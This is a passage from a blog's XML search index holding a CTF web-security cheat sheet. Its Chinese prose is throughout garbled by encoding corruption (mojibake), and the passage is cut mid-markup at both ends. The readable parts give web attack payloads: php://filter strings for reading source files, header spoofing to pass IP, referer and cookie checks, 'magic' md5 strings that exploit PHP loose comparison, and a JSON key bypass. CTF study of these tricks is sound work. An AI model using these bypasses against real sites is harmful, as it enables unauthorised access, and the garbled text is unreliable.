class="hljs-keyword">CMD</span><span class="language-bash"> [<span class="hljs-string">&quot;apachectl&quot;</span>, <span class="hljs-string">&quot;-DFOREGROUND&quot;</span>]</span><br></code></pre></td></tr></table></figure><p>è‹¥ mysql å‡ºç°è¿æ¥é”™è¯¯ä¸”æ˜¯å¯åŠ¨æœ‰é—®é¢˜ï¼Œå¯ä»¥å‚è€ƒ<a href="https://ivenwings.github.io/2020/02/18/docker_lamp%E7%8E%AF%E5%A2%83%E4%B8%8Bmysql%E5%90%AF%E5%8A%A8%E9%97%AE%E9%A2%98/">å¦ä¸€ç¯‡åšå®¢</a>ã€‚</p><p>å½“ç„¶ä¹Ÿå¯ä»¥å†™ä¸Š <code>docker-compose.yml</code>è§£å†³è¿™ä¸ªé—®é¢˜ã€‚</p><h1 id="æŒ–å‘-TO-DO"><a href="#æŒ–å‘-TO-DO" class="headerlink" title="æŒ–å‘ TO-DO"></a>æŒ–å‘ TO-DO</h1><p>To be continueâ€¦</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>Web</tag>
      
      <tag>Docker</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Web In CTF</title>
    <link href="/2019/07/14/Web-In-CTF/"/>
    <url>/2019/07/14/Web-In-CTF/</url>
    
    <content type="html"><![CDATA[<h1 id="Web-In-CTF"><a href="#Web-In-CTF" class="headerlink" title="Web In CTF"></a>Web In CTF</h1><h2 id="å¸¸è§å¥—è·¯"><a href="#å¸¸è§å¥—è·¯" class="headerlink" title="å¸¸è§å¥—è·¯"></a>å¸¸è§å¥—è·¯</h2><ul><li>çˆ†ç ´ï¼ŒåŒ…æ‹¬<code>md5</code>ã€çˆ†ç ´éšæœºæ•°ã€éªŒè¯ç è¯†åˆ«ç­‰</li><li>ç»•<code>WAF</code>ï¼ŒåŒ…æ‹¬èŠ±å¼ç»•<code>Mysql</code>ã€ç»•æ–‡ä»¶è¯»å–å…³é”®è¯æ£€æµ‹ä¹‹ç±»æ‹¦æˆª</li><li>èŠ±å¼ç©å¼„å‡ ä¸ªPHPç‰¹æ€§ï¼ŒåŒ…æ‹¬å¼±ç±»å‹ï¼Œ<code>strpos</code>å’Œ<code>===</code>ï¼Œååºåˆ—åŒ– <code>destruct</code>ã€<code>\0</code>æˆªæ–­</li><li>å„ç§æ‰¾æºç æŠ€å·§ï¼ŒåŒ…æ‹¬<code>git</code>ã€<code>svn</code>ã€<code>xxx.php.swp</code>ã€<code>*www*.(zip|tar.gz|rar|7z)</code>ã€<code>xxx.php.bak</code></li><li>æ–‡ä»¶ä¸Šä¼ ï¼ŒåŒ…æ‹¬èŠ±å¼æ–‡ä»¶åç¼€ <code>.php345</code> ï¼Œ<code>.inc</code>ï¼Œ <code>.phtml</code>ï¼Œ <code>.phpt</code>ï¼Œ <code>.phps</code>ã€å„ç§æ–‡ä»¶å†…å®¹æ£€æµ‹<code>&lt;?php</code>, <code>&lt;?</code>,  <code>&lt;%</code>,  <code>&lt;script language=php&gt;</code>ã€èŠ±å¼è§£ææ¼æ´</li><li><code>Mysql</code>ç±»å‹å·®å¼‚ï¼ŒåŒ…æ‹¬å’ŒPHPå¼±ç±»å‹ç±»ä¼¼çš„ç‰¹æ€§ï¼Œ<code>0x</code>ã€<code>0b</code>ã€<code>1e</code>ä¹‹ç±»ï¼Œ<code>varchar</code>å’Œ<code>integer</code>ç›¸äº’è½¬æ¢</li><li><code>open_basedir</code>ã€<code>disable_functions</code>èŠ±å¼ç»•è¿‡æŠ€å·§ï¼ŒåŒ…æ‹¬<code>dl</code>ã€<code>mail</code>ã€<code>imagick</code>ã€<code>bash</code>æ¼æ´ã€<code>DirectoryIterator</code>åŠå„ç§äºŒè¿›åˆ¶é€‰æ‰‹æ’è¶³çš„æ–¹æ³•</li><li>ç¤¾å·¥ï¼ŒåŒ…æ‹¬èŠ±å¼æŸ¥ç¤¾å·¥åº“ã€å¾®åšã€QQç­¾åã€<code>whois</code></li><li><code>windows</code>ç‰¹æ€§ï¼ŒåŒ…æ‹¬çŸ­æ–‡ä»¶åã€IISè§£ææ¼æ´ã€NTFSæ–‡ä»¶ç³»ç»Ÿé€šé…ç¬¦ã€<code>::$DATA</code>ï¼Œå†’å·æˆªæ–­</li><li>XSSï¼Œå„ç§æµè§ˆå™¨<code>auditor</code>ç»•è¿‡ã€å¯Œæ–‡æœ¬è¿‡æ»¤é»‘ç™½åå•ç»•è¿‡ã€<code>flash xss</code></li><li>XXEï¼Œå„ç§XMLå­˜åœ¨åœ°æ–¹ï¼ˆ<code>rss</code>&#x2F;<code>word</code>&#x2F;æµåª’ä½“ï¼‰ã€å„ç§XXEåˆ©ç”¨æ–¹æ³•ï¼ˆSSRFã€æ–‡ä»¶è¯»å–ï¼‰</li><li>HTTPåè®®ï¼ŒèŠ±å¼IPä¼ªé€ <code> X-Forwarded-For</code>&#x2F;<code>X-Client-IP</code>&#x2F;<code>X-Real-IP</code>&#x2F;<code>CDN-Src-IP</code>ã€èŠ±å¼æ”¹UAï¼ŒèŠ±å¼è—FLAGã€èŠ±å¼åˆ†ææ•°æ®åŒ…</li></ul><h2 id="ä¿¡æ¯æ³„éœ²"><a href="#ä¿¡æ¯æ³„éœ²" class="headerlink" title="ä¿¡æ¯æ³„éœ²"></a>ä¿¡æ¯æ³„éœ²</h2><h3 id="æŸ¥çœ‹æºä»£ç "><a href="#æŸ¥çœ‹æºä»£ç " class="headerlink" title="æŸ¥çœ‹æºä»£ç "></a>æŸ¥çœ‹æºä»£ç </h3><p>åœ¨çº¿ä¸ŠCTFèµ›äº‹çš„Webé¢˜ç›®ä¸­ï¼Œç½‘é¡µæºä»£ç æ˜¯ä¸€ä¸ªå¾ˆé‡è¦çš„æ€è·¯æ¥æºï¼ŒæŒ‰F12æˆ–å³é”®æŸ¥çœ‹æºä»£ç å³å¯ã€‚</p><h3 id="robots-txt"><a href="#robots-txt" class="headerlink" title="robots.txt"></a>robots.txt</h3><p>çˆ¬è™«åè®®ï¼Œæœ‰æ—¶å¯ä»¥é€šè¿‡å®ƒçœ‹è§ä¸€äº›é‡è¦çš„ç›®å½•ã€‚</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs arcade">User-agent: *<br>Disallow: <span class="hljs-regexp">/images/</span><br>Disallow: <span class="hljs-regexp">/f1ag.txt/</span><br>Disallow: /tips.php<br></code></pre></td></tr></table></figure><h3 id="æ³¨é‡Š"><a href="#æ³¨é‡Š" class="headerlink" title="æ³¨é‡Š"></a>æ³¨é‡Š</h3><p>ä¸€èˆ¬åœ¨å³é”®æºä»£ç ä¸­ï¼Œæœ‰æ—¶æ³¨é‡Šéšè—ç€é‡è¦çš„ä¿¡æ¯æˆ–è€…tipsï¼Œæˆ–è€…å‡ºé¢˜è€…å†™ä¸‹çš„æ€è·¯ã€‚</p><h3 id="å¤‡ä»½æ–‡ä»¶æºç æ³„æ¼"><a href="#å¤‡ä»½æ–‡ä»¶æºç æ³„æ¼" class="headerlink" title="å¤‡ä»½æ–‡ä»¶æºç æ³„æ¼"></a>å¤‡ä»½æ–‡ä»¶æºç æ³„æ¼</h3><p>â€‹å¸¸è§å¤‡ä»½æ–‡ä»¶åç¼€ï¼š</p><ul><li><p><code>.rar</code></p></li><li><p><code>.zip</code></p></li><li><p><code>.7z</code></p></li><li><p><code>.tar.gz</code></p></li><li><p><code>.bak</code></p></li><li><p><code>.swp</code></p></li><li><p><code>.txt</code></p></li><li><p><code>.html</code></p></li><li><p><code>linux</code>ä¸­å¯èƒ½ä»¥â€ <code>~</code> â€œ ç»“å°¾</p></li><li><p><code>ng</code>æºç æ³„éœ²ï¼Œ<code>git</code>æºç æ³„éœ²ï¼Œ<code>DS_Store</code>æ–‡ä»¶æ³„æ¼ï¼Œç½‘ç«™å¤‡ä»½å‹ç¼©æ–‡ä»¶ï¼ŒSVNå¯¼è‡´æ–‡ä»¶æ³„éœ²ï¼ŒWEB-INF&#x2F;web.xmlæ³„éœ²ï¼ŒCVSæ³„æ¼ç­‰ï¼Œå¯å‚è€ƒä»¥ä¸‹èµ„æ–™ï¼š</p><p><a href="https://www.cnblogs.com/xishaonian/p/7628153.html">CTFä¸­å¸¸è§Webæºç æ³„éœ²æ€»ç»“</a></p><p><a href="http://www.s2.sshz.org/post/source-code-leak/">å¸¸è§Webæºç æ³„éœ²è§£æ</a></p><p><a href="https://zhuanlan.zhihu.com/p/21296806">æ–‡ä»¶æ³„éœ²</a></p></li></ul><h3 id="includeæ¼æ´"><a href="#includeæ¼æ´" class="headerlink" title="includeæ¼æ´"></a>includeæ¼æ´</h3><p>é‡åˆ°<code>php</code>ä»£ç ä¸­æœ‰<code>include($file)</code>çš„ï¼Œä¸€èˆ¬å’Œ <code>php://input</code>æˆ–è€…<code>php://filter</code>æœ‰å…³ï¼Œâ€‹<code>$file</code>å€¼å¦‚æœæ˜¯<code>php://input</code>ï¼Œå°±è¦ç”¨postè¡¨å•æ„é€ æ•°æ®ï¼Œå¦‚æœæ˜¯<code>php://filter</code>ï¼Œå°±ç”¨ä¸‹é¢çš„payloadè¯»å–æ–‡ä»¶base64åŠ å¯†åçš„æºä»£ç ï¼Œè§£å¯†åæŸ¥çœ‹æºä»£ç ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">php:<span class="hljs-comment">//filter/read=convert.base64-encoding/resource=æ–‡ä»¶å(å¦‚index.php)</span><br>php:<span class="hljs-comment">//filter/read=convert.base64-encode/resource=index.php</span><br></code></pre></td></tr></table></figure><h2 id="æŠ“åŒ…-x2F-HTTP"><a href="#æŠ“åŒ…-x2F-HTTP" class="headerlink" title="æŠ“åŒ…&#x2F;HTTP"></a>æŠ“åŒ…&#x2F;HTTP</h2><h3 id="GET-amp-POST"><a href="#GET-amp-POST" class="headerlink" title="GET&amp;POST"></a>GET&amp;POST</h3><p>Getå’ŒPostæ“ä½œæ˜¯ä¼ å‚çš„åŸºæœ¬æ“ä½œï¼Œä¹Ÿæ˜¯CTFä¸­å¾ˆå¸¸è§çš„å¸¸è§„æ“ä½œã€‚</p><p>GETï¼šåœ¨<code>url</code>ä¸­æäº¤å‚æ•°ï¼Œå¦‚<code>/index.php?a=1</code></p><p>POSTï¼šå¯é€šè¿‡<code>hackbar</code>æˆ–æŠ“åŒ…æ’å…¥postæ•°æ®æäº¤</p><p>æœ€ç›´æ¥çš„åŒºåˆ«ï¼š</p><p>GETè¯·æ±‚çš„å‚æ•°æ˜¯æ”¾åœ¨URLé‡Œçš„ï¼ŒPOSTè¯·æ±‚å‚æ•°æ˜¯æ”¾åœ¨è¯·æ±‚bodyé‡Œçš„ã€‚</p><h3 id="HTTPå¤´éƒ¨ç»•è¿‡å§¿åŠ¿"><a href="#HTTPå¤´éƒ¨ç»•è¿‡å§¿åŠ¿" class="headerlink" title="HTTPå¤´éƒ¨ç»•è¿‡å§¿åŠ¿"></a>HTTPå¤´éƒ¨ç»•è¿‡å§¿åŠ¿</h3><ul><li><p>å¦‚æœæç¤ºéœ€è¦æœ¬åœ°ipæˆ–æŒ‡å®šipæ‰èƒ½è®¿é—®ï¼Œåˆ™å¯åœ¨æŠ¥æ–‡å¤´éƒ¨æ·»åŠ ä»¥ä¸‹å‡ ç§å¸¸ç”¨ä¿¡æ¯æ®µï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">X-Forwarded-For</span><span class="hljs-punctuation">: </span>127.0.0.1<br><span class="hljs-attribute">X-Client-IP</span><span class="hljs-punctuation">: </span>127.0.0.1<br><span class="hljs-attribute">Client-IP</span><span class="hljs-punctuation">: </span>127.0.0.1<br>(ipåœ°å€å¯ä»¥æ ¹æ®éœ€è¦ä¿®æ”¹)<br></code></pre></td></tr></table></figure></li><li><p>å¦‚æœéœ€è¦éªŒè¯ç½‘é¡µæ¥æºï¼Œå¦‚ä¸€å®šè¦ä»è°·æ­Œè·³è½¬è¿‡æ¥çš„é¡µé¢æ‰å…è®¸è®¿é—®ï¼Œåˆ™å¯åœ¨æŠ¥æ–‡å¤´éƒ¨æ·»åŠ ï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>https://www.google.com<br></code></pre></td></tr></table></figure></li><li><p>å¦‚æœç½‘é¡µéœ€è¦éªŒè¯cookieï¼Œæˆ‘ä»¬å¯ä»¥åœ¨httpå¤´éƒ¨åŠ å…¥ï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>u = stupid;<br></code></pre></td></tr></table></figure></li><li><p>é™¤äº†ä»¥ä¸Šå‡ ç§å¸¸è§çš„æƒ…å†µï¼Œè¿˜éœ€æ ¹æ®å…·ä½“æƒ…å†µæ¥ä½¿ç”¨ä¸åŒçš„æ“ä½œ</p></li></ul><h2 id="æºç å®¡è®¡"><a href="#æºç å®¡è®¡" class="headerlink" title="æºç å®¡è®¡"></a>æºç å®¡è®¡</h2><h3 id="phpå¼±ç±»å‹"><a href="#phpå¼±ç±»å‹" class="headerlink" title="phpå¼±ç±»å‹"></a>phpå¼±ç±»å‹</h3><h4 id="x3D-x3D-ä¸-x3D-x3D-x3D"><a href="#x3D-x3D-ä¸-x3D-x3D-x3D" class="headerlink" title="&#x3D;&#x3D; ä¸ &#x3D;&#x3D;&#x3D;"></a>&#x3D;&#x3D; ä¸ &#x3D;&#x3D;&#x3D;</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span> == <span class="hljs-variable">$b</span> ;<br><span class="hljs-variable">$a</span> === <span class="hljs-variable">$b</span> ;<br><span class="hljs-meta">?&gt;</span><br>    <br><span class="hljs-comment">//=== åœ¨è¿›è¡Œæ¯”è¾ƒçš„æ—¶å€™ï¼Œä¼šå…ˆåˆ¤æ–­ä¸¤ç§å­—ç¬¦ä¸²çš„ç±»å‹æ˜¯å¦ç›¸ç­‰ï¼Œå†æ¯”è¾ƒ</span><br><span class="hljs-comment">// == åœ¨è¿›è¡Œæ¯”è¾ƒçš„æ—¶å€™ï¼Œä¼šå…ˆå°†å­—ç¬¦ä¸²ç±»å‹è½¬åŒ–æˆç›¸åŒï¼Œå†æ¯”è¾ƒ</span><br></code></pre></td></tr></table></figure><p>å¦‚æœæ¯”è¾ƒä¸€ä¸ªæ•°å­—å’Œå­—ç¬¦ä¸²æˆ–è€…æ¯”è¾ƒæ¶‰åŠåˆ°æ•°å­—å†…å®¹çš„å­—ç¬¦ä¸²ï¼Œåˆ™å­—ç¬¦ä¸²ä¼šè¢«è½¬æ¢æˆæ•°å€¼å¹¶ä¸”æ¯”è¾ƒæŒ‰ç…§æ•°å€¼æ¥è¿›è¡Œ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-string">&quot;admin&quot;</span> == <span class="hljs-number">0</span>); <span class="hljs-comment">//true</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-string">&quot;1admin&quot;</span>== <span class="hljs-number">1</span>); <span class="hljs-comment">//true</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-string">&quot;admin1&quot;</span>== <span class="hljs-number">1</span>); <span class="hljs-comment">//false</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-string">&quot;admin1&quot;</span>== <span class="hljs-number">0</span>); <span class="hljs-comment">//true</span><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-string">&quot;0e123456&quot;</span>==<span class="hljs-string">&quot;0e4456789&quot;</span>); <span class="hljs-comment">//true </span><br><span class="hljs-meta">?&gt;</span>  <span class="hljs-comment">//ä¸Šè¿°ä»£ç å¯è‡ªè¡Œæµ‹è¯•</span><br>    <br> <span class="hljs-comment">// è§‚å¯Ÿä¸Šè¿°ä»£ç </span><br> <span class="hljs-comment">//&quot;admin&quot;==0 æ¯”è¾ƒçš„æ—¶å€™ï¼Œä¼šå°†adminè½¬åŒ–æˆæ•°å€¼ï¼Œå¼ºåˆ¶è½¬åŒ–,ç”±äºadminæ˜¯å­—ç¬¦ä¸²ï¼Œè½¬åŒ–çš„ç»“æœæ˜¯0è‡ªç„¶å’Œ0ç›¸ç­‰</span><br> <span class="hljs-comment">//&quot;1admin&quot;==1 æ¯”è¾ƒçš„æ—¶å€™ä¼šå°†1adminè½¬åŒ–æˆæ•°å€¼,ç»“æœä¸º1ï¼Œè€Œâ€œadmin1â€œ==1 å´ç­‰äºé”™è¯¯ï¼Œå³æ˜¯&quot;admin1&quot;è¢«è½¬åŒ–æˆäº†0,ä¸ºä»€ä¹ˆå‘¢ï¼Ÿï¼Ÿ</span><br> <span class="hljs-comment">//&quot;0e123456&quot;==&quot;0e456789&quot;ç›¸äº’æ¯”è¾ƒçš„æ—¶å€™ï¼Œä¼šå°†0eè¿™ç±»å­—ç¬¦ä¸²è¯†åˆ«ä¸ºç§‘å­¦æŠ€æœ¯æ³•çš„æ•°å­—ï¼Œ0çš„æ— è®ºå¤šå°‘æ¬¡æ–¹éƒ½æ˜¯é›¶ï¼Œæ‰€ä»¥ç›¸ç­‰</span><br></code></pre></td></tr></table></figure><p><code>php</code>æ‰‹å†Œï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">å½“ä¸€ä¸ªå­—ç¬¦ä¸²å½“ä½œä¸€ä¸ªæ•°å€¼æ¥å–å€¼ï¼Œå…¶ç»“æœå’Œç±»å‹å¦‚ä¸‹:å¦‚æœè¯¥å­—ç¬¦ä¸²æ²¡æœ‰åŒ…å«&#x27;.&#x27;,&#x27;e&#x27;,&#x27;E&#x27;å¹¶ä¸”å…¶æ•°å€¼å€¼åœ¨æ•´å½¢çš„èŒƒå›´ä¹‹å†…</span><br><span class="hljs-comment">è¯¥å­—ç¬¦ä¸²è¢«å½“ä½œintæ¥å–å€¼ï¼Œå…¶ä»–æ‰€æœ‰æƒ…å†µä¸‹éƒ½è¢«ä½œä¸ºfloatæ¥å–å€¼ï¼Œè¯¥å­—ç¬¦ä¸²çš„å¼€å§‹éƒ¨åˆ†å†³å®šäº†å®ƒçš„å€¼ï¼Œå¦‚æœè¯¥å­—ç¬¦ä¸²ä»¥åˆæ³•çš„æ•°å€¼å¼€å§‹ï¼Œåˆ™ä½¿ç”¨è¯¥æ•°å€¼ï¼Œå¦åˆ™å…¶å€¼ä¸º0ã€‚</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$test</span>=<span class="hljs-number">1</span> + <span class="hljs-string">&quot;10.5&quot;</span>; <span class="hljs-comment">// $test=11.5(float)</span><br><span class="hljs-variable">$test</span>=<span class="hljs-number">1</span>+<span class="hljs-string">&quot;-1.3e3&quot;</span>; <span class="hljs-comment">//$test=-1299(float)</span><br><span class="hljs-variable">$test</span>=<span class="hljs-number">1</span>+<span class="hljs-string">&quot;bob-1.3e3&quot;</span>;<span class="hljs-comment">//$test=1(int)</span><br><span class="hljs-variable">$test</span>=<span class="hljs-number">1</span>+<span class="hljs-string">&quot;2admin&quot;</span>;<span class="hljs-comment">//$test=3(int)</span><br><span class="hljs-variable">$test</span>=<span class="hljs-number">1</span>+<span class="hljs-string">&quot;admin2&quot;</span>;<span class="hljs-comment">//$test=1(int)</span><br><span class="hljs-meta">?&gt;</span><br>    <br>So that<span class="hljs-string">&#x27;s why &quot; &quot;admin1&quot;==1 =&gt;False &quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2020/02/07/12ScvV.png" alt="12ScvV.png"></p><h4 id="md5ç»•è¿‡-Hashæ¯”è¾ƒç¼ºé™·"><a href="#md5ç»•è¿‡-Hashæ¯”è¾ƒç¼ºé™·" class="headerlink" title="md5ç»•è¿‡(Hashæ¯”è¾ƒç¼ºé™·)"></a>md5ç»•è¿‡(Hashæ¯”è¾ƒç¼ºé™·)</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;Username&#x27;</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$logined</span> = <span class="hljs-literal">true</span>;<br>    <span class="hljs-variable">$Username</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;Username&#x27;</span>];<br>    <span class="hljs-variable">$password</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;password&#x27;</span>];<br><br>     <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">ctype_alpha</span>(<span class="hljs-variable">$Username</span>)) &#123;<span class="hljs-variable">$logined</span> = <span class="hljs-literal">false</span>;&#125;<br>     <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$password</span>) ) &#123;<span class="hljs-variable">$logined</span> = <span class="hljs-literal">false</span>;&#125;<br>     <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$Username</span>) != <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$password</span>)) &#123;<span class="hljs-variable">$logined</span> = <span class="hljs-literal">false</span>;&#125;<br>     <span class="hljs-keyword">if</span> (<span class="hljs-variable">$logined</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;successful&quot;</span>;<br>      &#125;<span class="hljs-keyword">else</span>&#123;<br>           <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;login failed!&quot;</span>;<br>        &#125;<br>    &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>å¤§æ„æ˜¯è¦è¾“å…¥ä¸€ä¸ªå­—ç¬¦ä¸²å’Œæ•°å­—ç±»å‹ï¼Œå¹¶ä¸”ä»–ä»¬çš„md5å€¼ç›¸ç­‰ï¼Œå°±å¯ä»¥æˆåŠŸæ‰§è¡Œä¸‹ä¸€æ­¥è¯­å¥ </p><p>ä»‹ç»ä¸€æ‰¹md5å¼€å¤´æ˜¯0eçš„å­—ç¬¦ä¸²</p><p><strong>0eåœ¨æ¯”è¾ƒçš„æ—¶å€™ä¼šå°†å…¶è§†ä½œä¸ºç§‘å­¦è®¡æ•°æ³•</strong>ï¼Œæ‰€ä»¥æ— è®º0eåé¢æ˜¯ä»€ä¹ˆï¼Œ0çš„å¤šå°‘æ¬¡æ–¹è¿˜æ˜¯0ã€‚</p><p>é”®å…¥**md5(â€˜240610708â€™) &#x3D;&#x3D; md5(â€˜QNKCDZOâ€™)**æˆåŠŸç»•è¿‡ï¼</p><p>æ”¶é›†md5å¼€å¤´æ˜¯0eçš„å­—ç¬¦ä¸²ï¼ˆæ¥æºäºç½‘ç»œï¼‰ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php">QNKCDZO<br><span class="hljs-number">0e830400451993494058024219903391</span><br><br>s878926199a<br><span class="hljs-number">0e545993274517709034328855841020</span><br>  <br>s155964671a<br><span class="hljs-number">0e342768416822451524974117254469</span><br>  <br>s214587387a<br><span class="hljs-number">0e848240448830537924465865611904</span><br>  <br>s214587387a<br><span class="hljs-number">0e848240448830537924465865611904</span><br>  <br>s878926199a<br><span class="hljs-number">0e545993274517709034328855841020</span><br>  <br>s1091221200a<br><span class="hljs-number">0e940624217856561557816327384675</span><br>  <br>s1885207154a<br><span class="hljs-number">0e509367213418206700842008763514</span><br></code></pre></td></tr></table></figure><h4 id="jsonç»•è¿‡"><a href="#jsonç»•è¿‡" class="headerlink" title="jsonç»•è¿‡"></a>jsonç»•è¿‡</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;message&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">json_decode</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;message&#x27;</span>]);<br>    <span class="hljs-variable">$key</span> =<span class="hljs-string">&quot;*********&quot;</span>;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$message</span>-&gt;key == <span class="hljs-variable">$key</span>) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;flag&quot;</span>;<br>    &#125; <br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;fail&quot;</span>;<br>    &#125;<br> &#125;<br> <span class="hljs-keyword">else</span>&#123;<br>     <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;~~~~&quot;</span>;<br> &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>è¾“å…¥ä¸€ä¸ªjsonç±»å‹çš„å­—ç¬¦ä¸²ï¼Œjson_decodeå‡½æ•°è§£æˆä¸€ä¸ªæ•°ç»„ï¼Œåˆ¤æ–­æ•°ç»„ä¸­keyçš„å€¼æ˜¯å¦ç­‰äº $keyçš„å€¼ï¼Œä½†æ˜¯$keyçš„å€¼æˆ‘ä»¬ä¸çŸ¥é“ï¼Œ<strong>ä½†æ˜¯å¯ä»¥åˆ©ç”¨0&#x3D;&#x3D;â€adminâ€è¿™ç§å½¢å¼ç»•è¿‡</strong>.</p><p>**æœ€ç»ˆpayload **</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json">message=<span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;key&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">0</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><h4 id="array-search-is-arrayç»•è¿‡"><a href="#array-search-is-arrayç»•è¿‡" class="headerlink" title="array_search is_arrayç»•è¿‡"></a>array_search is_arrayç»•è¿‡</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;test&#x27;</span>]))&#123;<span class="hljs-keyword">exit</span>();&#125;<br><span 